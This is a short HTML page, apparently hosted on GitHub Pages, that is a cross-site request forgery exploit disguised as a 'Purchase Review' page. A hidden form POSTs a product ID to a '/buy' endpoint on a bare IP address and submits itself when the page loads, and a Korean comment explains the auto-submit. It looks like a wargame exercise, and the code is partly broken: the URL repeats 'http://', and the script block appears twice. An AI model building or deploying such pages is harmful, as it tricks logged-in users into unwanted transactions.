# CaramelPain.github.io

<!DOCTYPE html>
<html>
<head>
    <title>Purchase Review</title>
</head>
<body>
    <h1>Reviewing Item...</h1>
    <form id="csrf-form" action="http://http://15.164.98.47:32689/buy" method="POST">
    <input type="hidden" name="product_id" value="[확인한_ID]"> 
</form>

<script>
    window.onload = function() {
        document.getElementById('csrf-form').submit();
    };
</script>

    <script>
        // 페이지가 로드되자마자 폼을 자동으로 제출합니다.
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>
